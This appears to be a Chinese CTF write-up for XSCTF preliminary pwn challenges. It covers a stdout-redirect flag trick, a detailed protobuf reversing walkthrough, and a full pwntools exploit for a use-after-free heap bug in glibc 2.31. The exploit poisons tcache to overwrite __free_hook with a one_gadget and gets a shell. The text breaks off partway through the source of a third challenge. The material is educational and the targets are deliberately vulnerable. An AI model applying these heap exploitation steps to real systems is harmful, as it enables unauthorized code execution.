---
title: XSCTF 初赛官方pwn题wp
date: '2024-12-09 21:12:23'
updated: '2025-04-07 21:33:52'
---
# XSCTF 初赛pwn题wp
## 明日方舟抽卡模拟器
getshell发现`standard output: Bad file descriptor`

发现是：`close(1)`关闭了标准输出，可以通过重定向获取flag：

`cat flag 1>&0 `或者 `cat flag 1>&2`

### 补充
重定向命令列表如下：

| 命令 | 说明 |
| :--- | :--- |
| command > file | 将输出重定向到 file。 |
| command < file | 将输入重定向到 file。 |
| command >> file | 将输出以追加的方式重定向到 file。 |
| n > file | 将文件描述符为 n 的文件重定向到 file。 |
| n >> file | 将文件描述符为 n 的文件以追加的方式重定向到 file。 |
| n >& m | 将输出文件 m 和 n 合并。 |
| n <& m | 将输入文件 m 和 n 合并。 |
| << tag | 将开始标记 tag 和结束标记 tag 之间的内容作为输入。 |


> 需要注意的是文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。
>

## QQbot
[来自c_lby师傅的博客](https://c-lby.top/2024/11/01/2024xsctf-QQbot-wp/)

### 0x00 前言
这道题出来就是防ak的，对于新生赛来说确实有点难度，如果之前没接触过protobuf，在短时间内没那么容易直接做出来。但是如果你现在跟着wp复现过一次，那么之后再遇到，就会没那么慌了，甚至游刃有余。

题目名称: QQbot

作者: `C_LBY`

题目类型: `pwn`

难度: 困难(对于新生赛，正常来讲这个顶多算中等)

考点：

1. protobuf逆向及数据交换
2. libc2.31 UAF 简单堆

描述: 最近Haruka和Hisola在捣鼓QQ机器人，C_LBY也想搞，于是学习了一种轻便高效的数据存储和交换格式，写了一个程序。奈何学艺不精，才开发到一半就被发现了有很多安全问题。你能帮他找到这些问题吗？

### 0x01 protobuf环境安装
有些选手拿到这道题附件发现没法直接运行，因为protobuf有自己的动态链接库，附件中也给出了（libprotobuf-c.so.1）。实际上一些高版本的ubuntu系统是自带了protobuf的，但是也运行不了的原因是题目用的库是针对C语言开发的，和原生的动态库不一样。并且这里因为出题需要，选择了比较低版本的protobuf。

如果你只是想要正常运行这个程序，有两个办法：

1. 把附件给出的libprotobuf-c.so.1放到自己linux系统的`/usr/local/lib`中
2. 利用patchelf改变程序动态链接库的位置到当前目录`patchelf --replace-needed libprotobuf-c.so.1 ./libprotobuf-c.so.1 bot`

但是实测上面两种方法有时候会因为各种奇奇怪怪的原因导致没法成功运行程序，并且其实解题的时候是需要用到完整的protobuf库的，所以建议完整安装，参考这篇[文章](https://c-lby.top/2024/10/11/protobuf-install/)。另外如果想要更详细的关于protobuf的介绍，网上很多，推荐[Real返璞归真师傅的全面解析](https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA)（本文会有部分内容参考该文章的分析模式）。

### 0x02 源码及编译
#### message.proto
```protobuf
syntax = "proto2";

message Message_request{
    required int32 id = 1;
    required string sender = 2;
    required uint32 len = 3;
    required bytes content = 4;
    required int32 actionid = 5;
}

message Message_response{
    required int32 id = 1;
    required string receiver = 2;
    required int32 status_code = 3;
    optional string error_message = 4;
}
```

生成C源文件和头文件到当前目录`protoc --c_out=. message.proto`

#### bot.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "message.pb-c.h"

int64_t ptr[0x10];
int64_t ptr_size[0x10];
char tmp[0x30];

void init();
void repeater(char *receiver, ProtobufCBinaryData content, MessageResponse *resp);
void add(int32_t id, int32_t len, ProtobufCBinaryData content, MessageResponse *resp);
void delete(int32_t id, MessageResponse *resp);
void show(int32_t id, MessageResponse *resp);
void edit(int32_t id, ProtobufCBinaryData content, MessageResponse *resp);
void Exit(MessageResponse *resp);
void invalid(char *receiver, char *errmsg, MessageResponse *resp);
void success(char *receiver, MessageResponse *resp);

void init()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setbuf(stderr, 0);
}

void repeater(char *receiver, ProtobufCBinaryData content, MessageResponse *resp)
{
    printf("%s\n", content.data);
    success(receiver, resp);
}

void add(int32_t id, int32_t len, ProtobufCBinaryData content, MessageResponse *resp)
{
    if (id > 0xf || ptr[id])
    {
        invalid("admin", "Id is used", resp);
    }
    else
    {
        ptr[id] = malloc(len);
        if (ptr[id] == NULL)
        {
            invalid("admin", "Malloc error", resp);
            exit(-1);
        }
        ptr_size[id] = len;
        memcpy(ptr[id], content.data, len);
        success("admin", resp);
    }
}

void delete(int32_t id, MessageResponse *resp)
{

    if (id <= 0xf && ptr[id])
    {
        free(ptr[id]);
        success("admin", resp);
    }
    else
    {
        invalid("admin", "Id is not used", resp);
    }
}

void show(int32_t id, MessageResponse *resp)
{

    if (id <= 0xf && ptr[id])
    {
        write(1, ptr[id], ptr_size[id]);
        success("admin", resp);
    }
    else
    {
        invalid("admin", "Id is not used", resp);
    }
}

void edit(int32_t id, ProtobufCBinaryData content, MessageResponse *resp)
{

    if (id <= 0xf && ptr[id])
    {
        memcpy(ptr[id], content.data, ptr_size[id]);
        success("admin", resp);
    }
    else
    {
        invalid("admin", "Id is not used", resp);
    }
}

void Exit(MessageResponse *resp)
{
    for (int i = 0; i <= 15; ++i)
    {
        if (!ptr[i])
        {
            free(ptr[i]);
            ptr[i] = NULL;
            ptr_size[i] = NULL;
        }
    }
    success("Goodbye admin", resp);
    exit(0);
}

void invalid(char *receiver, char *errmsg, MessageResponse *resp)
{
    void *buf = NULL;
    unsigned int len;

    resp->receiver = receiver;
    resp->status_code = 400;
    resp->error_message = errmsg;

    len = message_response__get_packed_size(resp);
    message_response__pack(resp, tmp);
    write(1, tmp, len);
    ++resp->id;
}

void success(char *receiver, MessageResponse *resp)
{
    void *buf = NULL;
    unsigned int len;

    resp->receiver = receiver;
    resp->status_code = 200;

    len = message_response__get_packed_size(resp);
    message_response__pack(resp, tmp);
    write(1, tmp, len);
    ++resp->id;
}

int main()
{
    init();
    unsigned int len;
    void *buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    MessageRequest *msg = NULL;
    MessageResponse resp = MESSAGE_RESPONSE__INIT;
    resp.id = 0;

    while (1)
    {
        printf("\nTESTTESTTEST!\n");
        len = read(0, buf, 0x550);
        asm volatile("xor %r12, %r12"); // 手动使ogg生效，否则只能给后门了，不然难度会暴增
        msg = message_request__unpack(NULL, len, buf);

        if (msg->len > 0x550)
        {
            invalid(msg->sender, "len too long", &resp);
            continue;
        }
        else if (msg->len == 0)
        {
            invalid(msg->sender, "len cannot be 0", &resp);
            continue;
        }

        if (msg->actionid == 0)
        {
            repeater(msg->sender, msg->content, &resp);
            continue;
        }
        else
        {
            if (!strcmp(msg->sender, "admin"))
            {
                switch (msg->actionid)
                {
                case 1:
                    add(msg->id, msg->len, msg->content, &resp);
                    break;
                case 2:
                    delete (msg->id, &resp);
                    break;
                case 3:
                    show(msg->id, &resp);
                    break;
                case 4:
                    edit(msg->id, msg->content, &resp);
                    break;
                case 5:
                    exit(&resp);
                    break;
                default:
                    invalid("admin", "Invalid actionid", &resp);
                    break;
                }
            }
            else
            {
                invalid(msg->sender, "Permisson denied", &resp);
                continue;
            }
        }
    }
    return 0;
}
```

编译`gcc message.pb-c.c bot.c -o bot -lprotobuf-c`

对于出题而言，比较值得一提的是在proto中对应的bytes类型数据，在其实现中是`ProtobufCBinaryData`。ProtobufCBinaryData其实是一个结构体，其中有两个成员：

```c
/**
 * Structure for the protobuf `bytes` scalar type.
 *
 * The data contained in a `ProtobufCBinaryData` is an arbitrary sequence of
 * bytes. It may contain embedded `NUL` characters and is not required to be
 * `NUL`-terminated.
 */
struct ProtobufCBinaryData {
    size_t	len;        /**< Number of bytes in the `data` field. */
    uint8_t	*data;      /**< Data bytes. */
};
```

（出自[protobuf-c源码](https://github.com/protobuf-c/protobuf-c/blob/master/protobuf-c/protobuf-c.h)第406行）这里先稍微提一嘴，后面会用得到。

### 0x03分析
#### protobuf相关
###### protobuf数据结构体逆向
message的源文件太长就不放了，可以自己生成，这里只关注会用到的部分。

程序放进IDA分析，关注到main函数先mmap了一块地址，接着出现了message相关的东西![](/images/a8c718bd4ae89dab50e5fb60fb55f10b.png)

####### PROTOBUF_C_MESSAGE_INIT

这里其实对应的是程序源码147行的INIT宏。在message.pb-c.h文件中可以找到它的宏展开如下

```c
#define MESSAGE_RESPONSE__INIT \
 { PROTOBUF_C_MESSAGE_INIT (&message_response__descriptor) \
    , 0, NULL, 0, NULL }
```

所以就是把`status`变量赋值成了`PROTOBUF_C_MESSAGE_INIT (&message_response__descriptor)`，然后把下面一坨v8 v9 v10一堆东西赋值成了0或null。实际上这些都只对应程序源码147行，之所以会被拆开赋值，是因为IDA没意识到其实这是个结构体。我们在message.pb-c.h中可以找到

```c
struct  MessageResponse
{
  ProtobufCMessage base;
  int32_t id;
  char *receiver;
  int32_t status_code;
  char *error_message;
};
```

也就是在proto中定义的一些数据，多了个base，对应的就是IDA中的status。你问这个proto结构体在IDA中怎么看出来？别急后面会讲到。

####### ProtobufCMessage

我们继续追踪下面的宏`PROTOBUF_C_MESSAGE_INIT`，在protobuf-c.h中可以找到`#define PROTOBUF_C_MESSAGE_INIT(descriptor) { descriptor, 0, NULL }`，因此可以想到`ProtobufCMessage`应该是一个拥有三个成员的结构体。

```plain
struct ProtobufCMessage {
    /** The descriptor for this message type. */
    const ProtobufCMessageDescriptor	*descriptor;
    /** The number of elements in `unknown_fields`. */
    unsigned				n_unknown_fields;
    /** The fields that weren't recognized by the parser. */
    ProtobufCMessageUnknownField		*unknown_fields;
};
```

第一个成员是一个ProtobufCMessageDescriptor结构体，后面分析。第二个成员记录了字段数量。根据上面源码可以看到response的字段数是4，后面我们也会再见到一次。

####### ProtobufCMessageDescriptor

```c
struct ProtobufCMessageDescriptor {
    /** Magic value checked to ensure that the API is used correctly. */
    uint32_t			magic;

    /** The qualified name (e.g., "namespace.Type"). */
    const char			*name;
    /** The unqualified name as given in the .proto file (e.g., "Type"). */
    const char			*short_name;
    /** Identifier used in generated C code. */
    const char			*c_name;
    /** The dot-separated namespace. */
    const char			*package_name;

    /**
     * Size in bytes of the C structure representing an instance of this
     * type of message.
     */
    size_t				sizeof_message;

    /** Number of elements in `fields`. */
    unsigned			n_fields;
    /** Field descriptors, sorted by tag number. */
    const ProtobufCFieldDescriptor	*fields;
    /** Used for looking up fields by name. */
    const unsigned			*fields_sorted_by_name;

    /** Number of elements in `field_ranges`. */
    unsigned			n_field_ranges;
    /** Used for looking up fields by id. */
    const ProtobufCIntRange		*field_ranges;

    /** Message initialisation function. */
    ProtobufCMessageInit		message_init;

    /** Reserved for future use. */
    void				*reserved1;
    /** Reserved for future use. */
    void				*reserved2;
    /** Reserved for future use. */
    void				*reserved3;
};
```

这个结构体要关注的东西有

+ 第一个成员magic，一般是0x28AAEEF9
+ 第二个name是数据结构体的名字，对应的是message.proto中的结构体名
+ 第五个成员package_name，如果为空则说明没定义package名
+ 第七个成员n_fields是字段数量
+ 第八个成员fields是一个指针（ProtobufCFieldDescriptor），指向储存字段的结构体，通过这个我们可以分析字段名和类型，后面会讲到。

当你双击IDA中的那个descriptor，他会跳转到.data.rel.ro段![](/images/fe713049a383d6f06242d4a2b26042d4.png)

相应的我们可以在message.pb-c.c中找到如下结构体

```c
const ProtobufCMessageDescriptor message_response__descriptor =
{
  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,
  "Message_response",
  "MessageResponse",
  "MessageResponse",
  "",
  sizeof(MessageResponse),
  4,
  message_response__field_descriptors,
  message_response__field_indices_by_name,
  1,  message_response__number_ranges,
  (ProtobufCMessageInit) message_response__init,
  NULL,NULL,NULL    /* reserved[123] */
};
```

我们可以通过d快捷键，在IDA上修改一下数据所占据的大小，让他好看一点![](/images/debb1fa86cc70e622a5f274e933213e3.png)

这样一看来就很清楚，这个名为message_response的结构体，字段数是4。如果不出意外，双击message_response__field_descriptors我们就可以开始分析它的字段了。

####### ProtobufCFieldDescriptor

从前面给出的代码可以看出来这个`message_response__field_descriptors`的类型是`ProtobufCFieldDescriptor`，我们从源代码看看这个结构体到底储存了一些什么信息：

```c
/**
 * Describes a single field in a message.
 */
struct ProtobufCFieldDescriptor {
    /** Name of the field as given in the .proto file. */
    const char		*name;

    /** Tag value of the field as given in the .proto file. */
    uint32_t		id;

    /** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */
    ProtobufCLabel		label;

    /** The type of the field. */
    ProtobufCType		type;

    /**
     * The offset in bytes of the message's C structure's quantifier field
     * (the `has_MEMBER` field for optional members or the `n_MEMBER` field
     * for repeated members or the case enum for oneofs).
     */
    unsigned		quantifier_offset;

    /**
     * The offset in bytes into the message's C structure for the member
     * itself.
     */
    unsigned		offset;

    /**
     * A type-specific descriptor.
     *
     * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the
     * corresponding `ProtobufCEnumDescriptor`.
     *
     * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to
     * the corresponding `ProtobufCMessageDescriptor`.
     *
     * Otherwise this field is NULL.
     */
    const void		*descriptor; /* for MESSAGE and ENUM types */

    /** The default value for this field, if defined. May be NULL. */
    const void		*default_value;

    /**
     * A flag word. Zero or more of the bits defined in the
     * `ProtobufCFieldFlag` enum may be set.
     */
    uint32_t		flags;

    /** Reserved for future use. */
    unsigned		reserved_flags;
    /** Reserved for future use. */
    void			*reserved2;
    /** Reserved for future use. */
    void			*reserved3;
};
```

这个结构体我们需要关注的东西有

1. name字段名
2. id字段编号
3. label字段类型
4. type数据类型
5. offset字段的值在数据包中的偏移
6. default_value在proto3版本中是没有的

我们回头看message.proto中的response，我们拿其中第一条字段来对比

```protobuf
message Message_response{
    required int32 id = 1;    <--看这个
    required string receiver = 2;
    required int32 status_code = 3;
    optional string error_message = 4;
}
```

他的name是”id”，id是1，label是required，type是int32。我们对照IDA中的descriptor去看（我调整了数据占据的大小和加了注释，原本是没有注释的，需要自己对着位置去看）![](/images/3c7f3729fb2c7c196f2842e464f52065.png)name是”id”，id是1很明显可以看出来，但是你发现像label和type他是用数字表示的。

####### ProtobufCLabel和ProtobufCType

那是因为在源码中他们是enum枚举类型的，我们根据枚举名可以在protobuf-c.h中找到定义

```c
typedef enum
{
    /** A well-formed message must have exactly one of this field. */
    PROTOBUF_C_LABEL_REQUIRED,

    /**
     * A well-formed message can have zero or one of this field (but not
     * more than one).
     */
    PROTOBUF_C_LABEL_OPTIONAL,

    /**
     * This field can be repeated any number of times (including zero) in a
     * well-formed message. The order of the repeated values will be
     * preserved.
     */
    PROTOBUF_C_LABEL_REPEATED,

    /**
     * This field has no label. This is valid only in proto3 and is
     * equivalent to OPTIONAL but no "has" quantifier will be consulted.
     */
    PROTOBUF_C_LABEL_NONE,
} ProtobufCLabel;

typedef enum
{
    PROTOBUF_C_TYPE_INT32,	  /**< int32 */
    PROTOBUF_C_TYPE_SINT32,	  /**< signed int32 */
    PROTOBUF_C_TYPE_SFIXED32, /**< signed int32 (4 bytes) */
    PROTOBUF_C_TYPE_INT64,	  /**< int64 */
    PROTOBUF_C_TYPE_SINT64,	  /**< signed int64 */
    PROTOBUF_C_TYPE_SFIXED64, /**< signed int64 (8 bytes) */
    PROTOBUF_C_TYPE_UINT32,	  /**< unsigned int32 */
    PROTOBUF_C_TYPE_FIXED32,  /**< unsigned int32 (4 bytes) */
    PROTOBUF_C_TYPE_UINT64,	  /**< unsigned int64 */
    PROTOBUF_C_TYPE_FIXED64,  /**< unsigned int64 (8 bytes) */
    PROTOBUF_C_TYPE_FLOAT,	  /**< float */
    PROTOBUF_C_TYPE_DOUBLE,	  /**< double */
    PROTOBUF_C_TYPE_BOOL,	  /**< boolean */
    PROTOBUF_C_TYPE_ENUM,	  /**< enumerated type */
    PROTOBUF_C_TYPE_STRING,	  /**< UTF-8 or ASCII string */
    PROTOBUF_C_TYPE_BYTES,	  /**< arbitrary byte sequence */
    PROTOBUF_C_TYPE_MESSAGE,  /**< nested message */
} ProtobufCType;
```

这样一来就可以把require和int32对上了。以此类推，我们通过分析这些字段，就可以把massage.proto完整地还原出来。顺带一提，逆向的时候发现是有default value的位置的，所以很明显这里用的是syntax=”proto2”。然后当你往下看主函数的代码，你会发现下面还有一个叫做”Message_request”的包，而且这个包才是我们这道题做数据交互最重要的部分，逆向过程同上，不再赘述。讲两个大家可能会考虑的问题：

1. 如果我只要用到request包做数据交互，response包用不到，那我在.proto文件中只写一个包然后生成py或者c文件是一样能用的。不同的包之间只要没有相互引用就是相对独立的。
2. .proto文件的名字起什么都无所谓，不会影响其内容的生成。
3. 可以在IDA里自己封装相应的结构体，然后给变量换成结构体成员类型，但是比较麻烦。这种小型protobuf项目，还原出来proto文件之后不用封装结构体也能够用了。如果比较大型的项目，数据比较多的话，还是建议自己还原一下结构体。

###### protobuf封包和解包函数分析
####### protobuf_c_message_unpack

刚刚给结构体初始化的函数看过了，不再赘述。我们接着主函数往下看可以看到一个

```c
v4 = read(0, buf, 0x550uLL);
v6 = message_request__unpack(0LL, v4, buf);
```

顾名思义，程序读取了一段request包的数据，然后对其进行了解包。老规矩，先去头文件找函数原型我们对照着看。不，我们还是直接看函数实现吧，一步到位解释清楚。

```c
MessageRequest *
       message_request__unpack
                     (ProtobufCAllocator  *allocator,
                      size_t               len,
                      const uint8_t       *data)
{
  return (MessageRequest *)
     protobuf_c_message_unpack (&message_request__descriptor,
                                allocator, len, data);
}
```

其实从这里就已经能够看出来第二个参数需要传入数据包的大小，然后第三个参数传入未解包的数据。但是秉着求真务实（好奇）的精神，我们还是去翻翻源码，看看他到底在解包的时候干了些什么事情。但其实我只是想搞清楚那个allocator是干什么的，因为查了这么多资料，没看到有对它的解释的。代码很长，就不贴上来了，自行去github查看。

但其实也能想到这个allocator和内存分配有关。我们顺着allocator这个参数往下找，最终可以发现他其实就是调用了malloc和free函数而已。合理推测，如果我们有其他对堆内存安全检查、其他堆管理器的实现或者用其他储存方式提供内存来解包等等需求的时候，就可以自定义一个allocator（结构体），然后传给解包函数去使用。如果我们传了NULL进去，那我们就会使用源代码中默认的malloc。

```c
protobuf_c_message_unpack(const ProtobufCMessageDescriptor *desc,
              ProtobufCAllocator *allocator,
              size_t len, const uint8_t *data)
{
    ...

    if (allocator == NULL)
        allocator = &protobuf_c__allocator;

    rv = do_alloc(allocator, desc->sizeof_message);
    if (!rv)
        return (NULL);
    scanned_member_slabs[0] = first_member_slab;

    required_fields_bitmap_len = (desc->n_fields + 7) / 8;
    if (required_fields_bitmap_len > sizeof(required_fields_bitmap_stack)) {
        required_fields_bitmap = do_alloc(allocator, required_fields_bitmap_len);
        if (!required_fields_bitmap) {
            do_free(allocator, rv);
            return (NULL);
        }
        required_fields_bitmap_alloced = TRUE;
    }
    memset(required_fields_bitmap, 0, required_fields_bitmap_len);
   
    ...
}
static ProtobufCAllocator protobuf_c__allocator = {
    .alloc = &system_alloc,
    .free = &system_free,
    .allocator_data = NULL,
};

static inline void *
do_alloc(ProtobufCAllocator *allocator, size_t size)
{
    return allocator->alloc(allocator->allocator_data, size);
}

static void *
system_alloc(void *allocator_data, size_t size)
{
    (void)allocator_data;
    return malloc(size);
}
```

这个过程解开了我的一个疑惑。因为在出题的时候其实我还没有关注源代码的实现的问题，但我出的是一道简单的堆题。当我写完这个程序在尝试写exp的时候，我调试发现竟然有几个我并没有申请的堆块。想都不用想肯定是protobuf搞的鬼，但是具体而言是到目前为止才真正找到幕后黑手。

小鸡子露出黑脚了吧嘿嘿。

回到message_request__unpack这个函数，它返回的是一个MessageRequest类型的指针，所以我们需要用一个对应类型的指针去接收，接收下来的地址就会指向解完包的数据。而MessageRequest这个结构体我们前面也有分析过了，其实就是一个base加上我们的数据字段，我们要使用到的，就是后面这些数据。

其他封包和获取大小之类的函数就不讲了，顾名思义。

####### ProtobufCBinaryData

前面埋了个伏笔，是时候来讲讲这个bytes类型在protobuf-c中的储存方式了。我们先接着往下看IDA的主函数逻辑，可以看到switch case，其实就是堆题经典菜单题。![](/images/225a9da2e0abe00a3b11d12f19bc099f.png)

通过刚刚逆向我们可以知道对应偏移的字段分别是谁。0x18对应的字段是id，0x20对应的是sender，0x28对应的是len，0x30对应的是content，0x40是actionid。问题来了，add函数里出现的0x38什么东西来的？？这时候就得请出ProtobufCBinaryData结构体了。

```plain
/**
 * Structure for the protobuf `bytes` scalar type.
 *
 * The data contained in a `ProtobufCBinaryData` is an arbitrary sequence of
 * bytes. It may contain embedded `NUL` characters and is not required to be
 * `NUL`-terminated.
 */
struct ProtobufCBinaryData
{
    size_t len;	   /**< Number of bytes in the `data` field. */
    uint8_t *data; /**< Data bytes. */
};
```

翻阅源码不难发现这个结构体，占着两个成员，根据IDA识别不出来结构体的尿性，IDA把他们分开处理了，所以准确来说0x30对应的是content.len，0x38是content.data。所以0x38处才是真正的内容。对照程序源码可以看到我在memcpy的时候我传入的是content.data。

#### 堆题攻击手法分析
###### 生成protobuf的python实现
我们先根据前面分析出来的message.proto数据先生成数据实现的python脚本(response没用所以我就没写进去了)

```protobuf
syntax = "proto2";

message Message_request{
    required int32 id = 1;
    required string sender = 2;
    required uint32 len = 3;
    required bytes content = 4;
    required int32 actionid = 5;
}
protoc --python_out=. message.proto
```

因为我还生成了C的文件，所以我这里生成的文件名字是message_pb2.py。在exp里面把这个文件import进去就行。具体用法看下面写的前置脚本。

###### 简单的函数分析
invalid函数和success函数就是对操作进行回应而已，没什么好关注的。别忘了让sender写成admin。repeater函数就是拿来玩的。

add函数传入的id不能超过15，也就是最多16个chunk，会检查是否已使用。在主函数中对len进行了检查不能超过0x550。

delete函数检查id使用情况，但是free之后没置零对应id的指针，有UAF漏洞。

show没什么限制。

edit也没什么限制，但是并不能修改size。

####### 前置脚本

我们先写出前置脚本：

```python
from pwn import *
import message_pb2 as pb
# r = process('./bot')
r = remote("43.248.97.213", 30202)
e = ELF('./bot')
libc = ELF('./libc.so.6')
context.log_level = 'debug'


def repeater(idx, len, content):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = 'admin'
    msg.len = len
    msg.content = content
    msg.actionid = 0
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def add(idx, len, content=b'c_lby'):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = len
    msg.content = content
    msg.actionid = 1
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def delete(idx):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = 1
    msg.content = b'c_lby'
    msg.actionid = 2
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def show(idx):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = 1
    msg.content = b'c_lby'
    msg.actionid = 3
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def edit(idx, content):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = 1
    msg.content = content
    msg.actionid = 4
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())
```

###### 堆风水布置
题目环境是libc2.31，各种hook还没有被删掉，又有UAF，大小又可以到0x500以上，那不随便造。先考虑泄露libc，因为2.31的tcachebin已经加入了doublefree检查，所以申请0x500大chunk释放掉，进入unsortedbin，然后利用UAF将libc地址show出来。

但是这里有个问题，在前面讲unpack函数的时候也讲过，解包的时候会malloc和free一些堆块，导致这道题其实堆环境并不干净，而且每一次操作，都会经历一次unpack，所以我们布置堆风水的时候要考虑到每一次的unpack使用的堆。

我们先来看unpack完之后堆环境长什么样：![](/images/e53d8270cb7916904936cd71539478f6.png)

一次unpack申请了三个chunk，bins中没有东西，可以视为没有释放堆块。按照正常思路，我们先申请一个大于0x480的chunk，id为0，然后申请一个小的chunk防止合并，id为1，然后释放chunk0，我们就能得到一个unsorted chunk。此时我利用UAF就可以把通过show chunk0把libc打印出来。但是，在unpack会申请堆块的情况下，我们在show操作的时候，unpack函数申请的堆块会从chunk0里切割，并且unpack函数会往堆块里写一些东西，我们本要泄露的libc地址就被破坏了。

所以我选择将计就计，既然他要切割，我就给他一个免费的chunk0给他随便切（前提是这个chunk足够大），我再另外造一个unsorted chunk出来泄露。于是泄露libc的堆可以这么布置：

```python
add(0, 0x500) # 拿来牺牲，随便切割的chunk0
add(1, 0x18)  # 防止合并
add(2, 0x480)  # unpack会申请堆地址，所以第一个unsortedchunk会被分割，用原本的ptr中存的地址是打印不出来libc地址的。虽然会打印0x500个字节里肯定有别的libc地址，但是为了方便，还是再申请一个unsortedchunk来泄露libc地址。
add(3, 0x18)
delete(0)
delete(2)
show(2)

libc_base = u64(r.recv(6).ljust(8, b'\x00'))-0x1ECFF0
log.info('libc_base:'+hex(libc_base))
```

泄露出来libc之后就轻松了。泄露出来libc之后，chunk2对于我们来说已经没有用了，他也拿去给unpack随便切割。我们接下来要申请一些tcache chunk进行tcache poisoning，完成对free hook的劫持，劫持成one gadget。需要注意的是我们申请的堆块不能是0x50或者是0x20的，因为他们一旦进入了tcachebin，那么在下一次操作的时候就会被unpack给申请走，那就麻烦了。这里很简单就不讲了，如果不会，建议先去学tcachebin attack，学ptmalloc2机制。

```python
add(5, 0x70)
add(6, 0x70)
delete(5)
delete(6)
edit(6, p64(libc_base+libc.symbols['__free_hook']))

add(7, 0x70)
add(8, 0x70, p64(libc_base+0xe3afe))

delete(7)  # getshell
```

### 0x04 EXP
```python
from pwn import *
import message_pb2 as pb
r = process('./bot')
# r = remote("43.248.97.213", 30202)
e = ELF('./bot')
libc = ELF('./libc.so.6')
context.log_level = 'debug'


def repeater(idx, len, content):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = 'admin'
    msg.len = len
    msg.content = content
    msg.actionid = 0
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def add(idx, len, content=b'c_lby'):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = len
    msg.content = content
    msg.actionid = 1
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def delete(idx):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = 1
    msg.content = b'c_lby'
    msg.actionid = 2
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def show(idx):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = 1
    msg.content = b'c_lby'
    msg.actionid = 3
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def edit(idx, content):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = 1
    msg.content = content
    msg.actionid = 4
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


# gdb.attach(r, 'b *$rebase(0x1D7B)')
# pause()

add(0, 0x500)
add(1, 0x18)
add(2, 0x480)  # unpack会申请堆地址，所以第一个unsortedchunk会被分割，用原本的ptr中存的地址是打印不出来libc地址的。虽然会打印0x500个，但是为了方便，还是再申请一个unsortedchunk来泄露libc地址。
add(3, 0x18)
delete(0)
delete(2)
show(2)

libc_base = u64(r.recv(6).ljust(8, b'\x00'))-0x1ECFF0
log.info('libc_base:'+hex(libc_base))

add(5, 0x70)
add(6, 0x70)
delete(5)
delete(6)
edit(6, p64(libc_base+libc.symbols['__free_hook']))

add(7, 0x70)
add(8, 0x70, p64(libc_base+0xe3afe))

delete(7)  # getshell

r.interactive()
```

### 0x05 总结
其实讲真的，这道题的堆风水的布置就是小儿科级别的。protobuf逆向也并没有这么困难，只是对着模板套公式的罢了。对于一个新生赛而言，尽管是大二的pwn手，这个知识点也算是比较偏的考点（虽然近些年常见于各个大型比赛比如ciscn），是一个相对较新的知识点。在一场时间有限的比赛中开始学习并应用一个新的知识点，非常考验选手的检索、理解能力和耐心。但是如果只是看到题目就开始畏难，就算搜到了详细的教程也不愿意去尝试，那这道题从一开始就可以判负了。

虽然题目很简单，也不是什么大型比赛，但是也希望大家能从中学到一点东西。

## pokemon_master
:::info
宝可梦大师！  
你是纪南镇的一名宝可梦新手，你已经达到了可以外出探险的年纪，请外出探险，成为伟大的冒险家吧！传闻外面有很强大的神兽，击败它会获得神器。

TIPS：

1.商店卖的防御剂有惊喜

2.负数溢出

3.选速度最快的精灵

4.貌似有一个hook？

5.覆水亦可收，free掉的堆块还能申请回来

6.申请回特殊堆块可改写hook

:::

源码太长了，单独一桌

基本原理不难，但是逆向难度对于新生来说是有点挑战性的(无论是代码量还是结构体逆向)，花点时间知道原理还是能做出来的，更何况放了那么多tips。

游戏题：数组溢出、整数溢出比较多

### 0x0 源码
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>   
#include<string.h>
#define MAXMAX 9999
#define MINMIN 1

struct pokemon{
    char name[16];
    unsigned int hp;
    unsigned int attack;
    unsigned int speed;
    unsigned int defence;
};

void init();
void Start_choose(struct pokemon** mypoke);
void Start_print();
void Mainmenu();
void Outmenu();
void Skillmenu();
void Out(struct pokemon** mypoke);
void Store(struct pokemon** mypoke);
void Status(struct pokemon** mypoke);
void Pokemon_name(struct pokemon** mypoke,char* str);
void Pokemon_print(struct pokemon** mypoke);
int Fight(struct pokemon** mypoke,struct pokemon* emerypoke);
int money=0;
int change=0;

size_t *ex1t;


//函数指针  堆
int main()
{
    init();
    Start_print();

    int choice;
    char say[32];
    struct pokemon* mypoke;
    Start_choose(&mypoke);
    puts("You open the Starter Pack and get a hundred coins");
    money+=100;
    printf("gift:%p\n",&puts);
    while(1)
    {
        whilestart:
        if(money <0){
            puts("No money, you out:(");
            break;
        }
        Mainmenu();
        scanf("%d",&choice);
        switch (choice)
        {
        case 1:
            Store(&mypoke); //STORE
            break;
        case 2:     //OUT
            Out(&mypoke);
            break;
        case 3:  //STATUS
            Status(&mypoke);
            break;
        case 4:
            /* code */
            puts("\nWhat you want to say?");
